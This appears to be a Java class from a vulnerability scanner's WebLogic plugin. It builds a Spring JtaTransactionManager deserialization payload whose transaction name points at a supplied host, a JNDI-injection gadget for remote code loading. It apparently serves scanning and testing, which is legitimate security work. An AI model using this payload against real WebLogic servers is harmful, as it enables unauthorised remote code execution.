package com.gbw.scanner.plugins.scripts.weblogic.payload;

import com.bea.core.repackaged.springframework.transaction.jta.JtaTransactionManager;
import com.bea.core.repackaged.springframework.transaction.support.AbstractPlatformTransactionManager;
import com.gbw.scanner.Host;


public class GBWSpringJndi implements GBWNoEchoPayload<AbstractPlatformTransactionManager> {

	public AbstractPlatformTransactionManager getObject (Host host){
		JtaTransactionManager jtaTransactionManager = new JtaTransactionManager();

		jtaTransactionManager.setUserTransactionName(host.toString());

		return jtaTransactionManager;
	}

	@Override
	public String getName() {
		return "GBWSpringJndi";
	}
}
